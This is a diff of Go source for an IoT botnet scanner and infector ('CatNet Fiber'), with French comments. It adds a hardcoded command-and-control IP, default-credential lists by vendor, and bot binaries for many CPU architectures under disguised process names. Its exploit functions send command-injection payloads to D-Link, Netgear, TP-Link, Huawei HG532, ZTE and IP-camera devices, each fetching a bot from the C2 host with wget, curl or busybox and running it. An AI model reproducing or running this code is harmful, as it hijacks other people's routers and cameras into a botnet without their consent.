@@ -1,5 +1,6 @@
 /*
-Thrown out by bermuda!
+CatNet Fiber - Scanner et infecteur optimisé
+Version 2.0
 */
 
 package main
@@ -14,88 +15,385 @@ import (
     "strings"
 	"strconv"
     "math/rand"
+    "crypto/tls"
+    "io/ioutil"
+    "net/http"
+    "encoding/base64"
+    "path/filepath"
+    "context"
+    "runtime"
 )
 
-var syncWait sync.WaitGroup
-var statusLogins, statusAttempted, statusFound int
-var loginsString = []string{"adminisp:adminisp", "admin:admin", "admin:123456", "admin:user", "admin:1234", "guest:guest", "support:support", "user:user", "admin:password", "default:default", "admin:password123"}
+// Statistiques et synchronisation
+var (
+    syncWait sync.WaitGroup
+    statusLogins, statusAttempted, statusFound, statusInfected int
+    mutex = &sync.Mutex{}
+    ctx, cancel = context.WithCancel(context.Background())
+    startTime = time.Now()
+)
 
-// Serveur C2 - séparer l'adresse IP et le port pour les commandes wget/curl
-var c2ServerIP = "51.68.128.169"
-var c2ServerPort = "1337"
-var c2Server = c2ServerIP + ":" + c2ServerPort
+// Configuration du serveur C2
+var (
+    c2ServerIP = "51.68.128.169"
+    c2ServerPort = "1337"
+    c2Server = c2ServerIP + ":" + c2ServerPort
+    c2HttpServer = "http://" + c2ServerIP
+    c2HttpsServer = "https://" + c2ServerIP
+)
 
-// Sémaphore pour limiter les connexions concurrentes
-var sem = make(chan struct{}, 1000) // Limite à 1000 connexions concurrentes
-var mutex = &sync.Mutex{}
+// Gestion des connexions concurrentes
+var (
+    // Sémaphore pour limiter les connexions concurrentes
+    sem = make(chan struct{}, 2000) // Augmenté à 2000 connexions concurrentes
+    // Canal pour les résultats d'infection
+    resultChan = make(chan string, 100)
+    // Canal pour les cibles vulnérables
+    vulnerableChan = make(chan string, 500)
+)
 
+// Données d'authentification pour les appareils
+var (
+    // Combinaisons login:mot de passe courantes
+    loginsString = []string{
+        "adminisp:adminisp", "admin:admin", "admin:123456", "admin:user", "admin:1234", 
+        "guest:guest", "support:support", "user:user", "admin:password", "default:default", 
+        "admin:password123", "root:root", "root:admin", "root:password", "root:1234", 
+        "admin:admin123", "admin:12345", "admin:54321", "admin:pass", "admin:adminadmin",
+        "admin:", "root:", "supervisor:supervisor", "ubnt:ubnt", "service:service",
+        "guest:12345", "admin:4321", "admin:1111", "admin:666666", "admin:1234567890",
+        "admin:888888", "admin:54321", "admin:00000000", "admin:9999"
+    }
+    
+    // Combinaisons spécifiques par fabricant
+    vendorLogins = map[string][]string{
+        "mikrotik": {"admin:", "admin:admin", "admin:password"},
+        "huawei":   {"admin:admin", "telecomadmin:admintelecom", "root:admin"},
+        "zte":      {"admin:admin", "root:Zte521", "root:root"},
+        "cisco":    {"admin:admin", "cisco:cisco", "enable:system"},
+        "dlink":    {"admin:admin", "admin:", "admin:password"},
+        "juniper":  {"admin:admin123", "root:juniper123", "super:juniper123"},
+        "netgear":  {"admin:password", "admin:admin", "admin:1234"},
+        "tplink":   {"admin:admin", "admin:password", "root:root"},
+        "ubiquiti": {"ubnt:ubnt", "admin:admin", "admin:ubnt"},
+        "asus":     {"admin:admin", "admin:password", "root:root"},
+        "linksys":  {"admin:admin", "admin:password", "root:root"},
+        "hikvision":{"admin:12345", "admin:admin", "root:pass"},
+        "dahua":    {"admin:admin", "888888:888888", "666666:666666"},
+    }
+    
+    // Ports courants à scanner
+    commonPorts = []string{"80", "81", "82", "83", "84", "88", "8080", "8081", "8082", "8083", "8084", "8088", "8888", "9000"}
+)
+
+// Structure pour les malwares disponibles
+type Malware struct {
+    name     string
+    path     string
+    arch     string
+    args     string
+    priority int
+}
+
+// Structure pour les vulnérabilités
+type Vulnerability struct {
+    name        string
+    description string
+    check       func(string) bool
+    exploit     func(string, string, string, string) bool
+}
+
+// Structure pour les méthodes de téléchargement
+type DownloadMethod struct {
+    name    string
+    command string
+}
+
+// Liste des malwares disponibles
+var malwares = []Malware{
+    {"bot", "/bot.mips", "mips", "mips", 1},
+    {"bot", "/bot.arm", "arm", "arm", 2},
+    {"bot", "/bot.arm7", "arm7", "arm7", 3},
+    {"bot", "/bot.x86", "x86", "x86", 4},
+    {"bot", "/bot.x86_64", "x86_64", "x86_64", 5},
+    {"bot", "/bot.sh4", "sh4", "sh4", 6},
+    {"bot", "/bot.m68k", "m68k", "m68k", 7},
+    {"bot", "/bot.ppc", "ppc", "ppc", 8},
+    {"bot", "/bot.sparc", "sparc", "sparc", 9},
+}
+
+// Noms pour camoufler le malware
+var hideNames = []string{
+    "sysupdate",
+    "systemd-worker",
+    "kworker",
+    "crond",
+    "udevd",
+    "ntpd",
+    "sshd",
+    "dropbear",
+    "telnetd",
+    "systemd",
+    "network-manager",
+    "dnsmasq",
+    "cron-apt",
+    "syslogd",
+    "logrotate",
+    "crontab",
+    "watchdog",
+}
+
+// Chemins d'installation
+var installPaths = []string{
+    "/tmp",
+    "/var/tmp",
+    "/dev",
+    "/var/run",
+    "/var/lock",
+    "/bin",
+    "/usr/bin",
+    "/usr/local/bin",
+    "/opt",
+    "/var",
+    "/mnt",
+    "/lib",
+    "/etc",
+}
+
+// Méthodes de téléchargement
+var downloadMethods = []DownloadMethod{
+    {"wget", "wget http://%s%s -O %s/.%s"},
+    {"curl", "curl -s http://%s%s -o %s/.%s"},
+    {"busybox wget", "busybox wget http://%s%s -O %s/.%s"},
+    {"tftp", "tftp -g -r %s %s -l %s/.%s"},
+    {"ftpget", "ftpget %s %s/.%s %s"},
+    {"busybox ftpget", "busybox ftpget %s %s/.%s %s"},
+}
+
+// Utilitaires
+
+// Effacer les données d'un tableau d'octets
 func zeroByte(a []byte) {
     for i := range a {
         a[i] = 0
     }
 }
 
+// Générer un nom de fichier aléatoire
+func randomFileName() string {
+    const chars = "abcdefghijklmnopqrstuvwxyz"
+    result := make([]byte, 8)
+    for i := range result {
+        result[i] = chars[rand.Intn(len(chars))]
+    }
+    return string(result)
+}
+
+// Créer un client HTTP avec timeout
+func createHTTPClient() *http.Client {
+    tr := &http.Transport{
+        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+        IdleConnTimeout: 30 * time.Second,
+    }
+    return &http.Client{
+        Transport: tr,
+        Timeout:   time.Second * 10,
+    }
+}
+
+// Vérifier si un port est ouvert
+func isPortOpen(target string, timeout time.Duration) bool {
+    conn, err := net.DialTimeout("tcp", target, timeout)
+    if err != nil {
+        return false
+    }
+    conn.Close()
+    return true
+}
+
+// Fonctions d'exploitation
+
 // Exploiter la vulnérabilité RCE dans les routeurs D-Link
-func exploitDlinkRCE(target string, c2Server string, hideName string, malwarePath string) {
+func exploitDlinkRCE(target string, c2Server string, hideName string, malwarePath string) bool {
 	// Vulnérabilité d'exécution de commande dans les routeurs D-Link
 	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
 	if err != nil {
-		return
+		return false
 	}
+	defer conn.Close()
 
-	// Construire la commande d'exploitation
-	exploitCmd := fmt.Sprintf("command=wget http://%s%s -O /tmp/.%s && chmod 777 /tmp/.%s && /tmp/.%s mips &", 
-		c2ServerIP, malwarePath, hideName, hideName, hideName)
+	// Construire la commande d'exploitation avec plusieurs méthodes de téléchargement
+	exploitCmd := fmt.Sprintf("command=cd /tmp && rm -rf .%s && (wget http://%s%s -O .%s || curl -s http://%s%s -o .%s || busybox wget http://%s%s -O .%s) && chmod 777 .%s && ./.%s mips &", 
+		hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
 	
 	// Envoyer la requête pour exploiter la vulnérabilité
-	httpRequest := fmt.Sprintf("POST /apply.cgi HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s\r\n\r\n",
+	httpRequest := fmt.Sprintf("POST /apply.cgi HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
 		target, len(exploitCmd), exploitCmd)
 
 	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
-	conn.Write([]byte(httpRequest))
-	conn.Close()
+	_, err = conn.Write([]byte(httpRequest))
+	
+	// Essayer aussi la vulnérabilité alternative
+	exploitCmd2 := fmt.Sprintf("username=admin&password=admin&login=&ping_addr=127.0.0.1; cd /tmp && rm -rf .%s && wget http://%s%s -O .%s && chmod 777 .%s && ./.%s mips &", 
+		hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
+	
+	httpRequest2 := fmt.Sprintf("POST /ping.cgi HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
+		target, len(exploitCmd2), exploitCmd2)
+
+	conn2, err := net.DialTimeout("tcp", target, 10 * time.Second)
+	if err == nil {
+		conn2.SetWriteDeadline(time.Now().Add(10 * time.Second))
+		conn2.Write([]byte(httpRequest2))
+		conn2.Close()
+	}
+	
+	return true
 }
 
 // Exploiter la vulnérabilité dans les routeurs Netgear
-func exploitNetgearRCE(target string, c2Server string, hideName string, malwarePath string) {
+func exploitNetgearRCE(target string, c2Server string, hideName string, malwarePath string) bool {
 	// Vulnérabilité d'exécution de commande dans les routeurs Netgear
 	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
 	if err != nil {
-		return
+		return false
 	}
+	defer conn.Close()
 
-	// Construire la commande d'exploitation
-	exploitCmd := fmt.Sprintf("wget http://%s%s -O /tmp/.%s && chmod 777 /tmp/.%s && /tmp/.%s mips &", 
-		c2Server, malwarePath, hideName, hideName, hideName)
+	// Construire la commande d'exploitation avec plusieurs méthodes de téléchargement
+	exploitCmd := fmt.Sprintf("cd /tmp && rm -rf .%s && (wget http://%s%s -O .%s || curl -s http://%s%s -o .%s || busybox wget http://%s%s -O .%s) && chmod 777 .%s && ./.%s mips &", 
+		hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
 	
 	// Envoyer la requête pour exploiter la vulnérabilité
-	httpRequest := fmt.Sprintf("GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=%s&curpath=/&currentsetting.htm=1 HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
+	httpRequest := fmt.Sprintf("GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=%s&curpath=/&currentsetting.htm=1 HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nConnection: close\r\n\r\n",
 		exploitCmd, target)
 
 	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
-	conn.Write([]byte(httpRequest))
-	conn.Close()
+	_, err = conn.Write([]byte(httpRequest))
+	
+	// Essayer aussi la vulnérabilité alternative
+	conn2, err := net.DialTimeout("tcp", target, 10 * time.Second)
+	if err == nil {
+		defer conn2.Close()
+		
+		// Vulnérabilité dans le firmware plus récent
+		exploitCmd2 := fmt.Sprintf("cd /tmp && rm -rf .%s && wget http://%s%s -O .%s && chmod 777 .%s && ./.%s mips &", 
+			hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
+		
+		httpRequest2 := fmt.Sprintf("GET /cgi-bin/;%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
+			exploitCmd2, target)
+		
+		conn2.SetWriteDeadline(time.Now().Add(10 * time.Second))
+		conn2.Write([]byte(httpRequest2))
+	}
+	
+	return true
 }
 
 // Exploiter la vulnérabilité dans les caméras IP
-func exploitIPCameraRCE(target string, c2Server string, hideName string, malwarePath string) {
+func exploitIPCameraRCE(target string, c2Server string, hideName string, malwarePath string) bool {
 	// Vulnérabilité d'exécution de commande dans les caméras IP
 	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
 	if err != nil {
-		return
+		return false
 	}
+	defer conn.Close()
 
-	// Construire la commande d'exploitation
-	exploitCmd := fmt.Sprintf("wget http://%s%s -O /tmp/.%s && chmod 777 /tmp/.%s && /tmp/.%s mips &", 
-		c2Server, malwarePath, hideName, hideName, hideName)
+	// Construire la commande d'exploitation avec plusieurs méthodes de téléchargement
+	exploitCmd := fmt.Sprintf("cd /tmp && rm -rf .%s && (wget http://%s%s -O .%s || curl -s http://%s%s -o .%s || busybox wget http://%s%s -O .%s) && chmod 777 .%s && ./.%s mips &", 
+		hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
 	
 	// Envoyer la requête pour exploiter la vulnérabilité
-	httpRequest := fmt.Sprintf("GET /system.ini?loginuse&loginpas&%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
+	httpRequest := fmt.Sprintf("GET /system.ini?loginuse&loginpas&%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nConnection: close\r\n\r\n",
 		exploitCmd, target)
 
 	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
-	conn.Write([]byte(httpRequest))
-	conn.Close()
+	_, err = conn.Write([]byte(httpRequest))
+	
+	// Essayer aussi la vulnérabilité alternative pour les caméras Hikvision
+	conn2, err := net.DialTimeout("tcp", target, 10 * time.Second)
+	if err == nil {
+		defer conn2.Close()
+		
+		exploitCmd2 := fmt.Sprintf("cd /tmp && rm -rf .%s && wget http://%s%s -O .%s && chmod 777 .%s && ./.%s mips &", 
+			hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
+		
+		httpRequest2 := fmt.Sprintf("GET /command.php?cmd=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
+			exploitCmd2, target)
+		
+		conn2.SetWriteDeadline(time.Now().Add(10 * time.Second))
+		conn2.Write([]byte(httpRequest2))
+	}
+	
+	return true
+}
+
+// Exploiter la vulnérabilité dans les routeurs TP-Link
+func exploitTPLinkRCE(target string, c2Server string, hideName string, malwarePath string) bool {
+	// Vulnérabilité d'exécution de commande dans les routeurs TP-Link
+	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
+	if err != nil {
+		return false
+	}
+	defer conn.Close()
+
+	// Construire la commande d'exploitation
+	exploitCmd := fmt.Sprintf("cd /tmp && rm -rf .%s && (wget http://%s%s -O .%s || curl -s http://%s%s -o .%s || busybox wget http://%s%s -O .%s) && chmod 777 .%s && ./.%s mips &", 
+		hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
+	
+	// Envoyer la requête pour exploiter la vulnérabilité
+	httpRequest := fmt.Sprintf("POST /cgi?2 HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n[COMMANDS];%s;[/COMMANDS]",
+		target, len(exploitCmd)+22, exploitCmd)
+
+	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+	_, err = conn.Write([]byte(httpRequest))
+	return true
+}
+
+// Exploiter la vulnérabilité dans les routeurs Huawei HG532
+func exploitHuaweiRCE(target string, c2Server string, hideName string, malwarePath string) bool {
+	// Vulnérabilité d'exécution de commande dans les routeurs Huawei HG532
+	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
+	if err != nil {
+		return false
+	}
+	defer conn.Close()
+
+	// Construire la commande d'exploitation
+	exploitCmd := fmt.Sprintf("cd /tmp && rm -rf .%s && (wget http://%s%s -O .%s || curl -s http://%s%s -o .%s || busybox wget http://%s%s -O .%s) && chmod 777 .%s && ./.%s mips &", 
+		hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
+	
+	// Payload pour la vulnérabilité CVE-2017-17215
+	payload := fmt.Sprintf("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n<s:Body>\n<u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n<NewStatusURL>$(/bin/sh -c '%s')</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n</s:Body>\n</s:Envelope>", exploitCmd)
+	
+	// Envoyer la requête SOAP pour exploiter la vulnérabilité
+	httpRequest := fmt.Sprintf("POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/xml\r\nContent-Length: %d\r\nSOAPAction: urn:schemas-upnp-org:service:WANPPPConnection:1#Upgrade\r\nConnection: close\r\n\r\n%s",
+		target, len(payload), payload)
+
+	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+	_, err = conn.Write([]byte(httpRequest))
+	return true
+}
+
+// Exploiter la vulnérabilité dans les routeurs ZTE
+func exploitZTERCE(target string, c2Server string, hideName string, malwarePath string) bool {
+	// Vulnérabilité d'exécution de commande dans les routeurs ZTE
+	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
+	if err != nil {
+		return false
+	}
+	defer conn.Close()
+
+	// Construire la commande d'exploitation
+	exploitCmd := fmt.Sprintf("cd /tmp && rm -rf .%s && (wget http://%s%s -O .%s || curl -s http://%s%s -o .%s || busybox wget http://%s%s -O .%s) && chmod 777 .%s && ./.%s mips &", 
+		hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, c2ServerIP, malwarePath, hideName, hideName, hideName)
+	
+	// Envoyer la requête pour exploiter la vulnérabilité
+	httpRequest := fmt.Sprintf("POST /web_shell_cmd.gch HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\ncmd=%s",
+		target, len(exploitCmd)+4, exploitCmd)
+
+	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+	_, err = conn.Write([]byte(httpRequest))
+	return true
 }
 
 func sendExploit(target string) int {
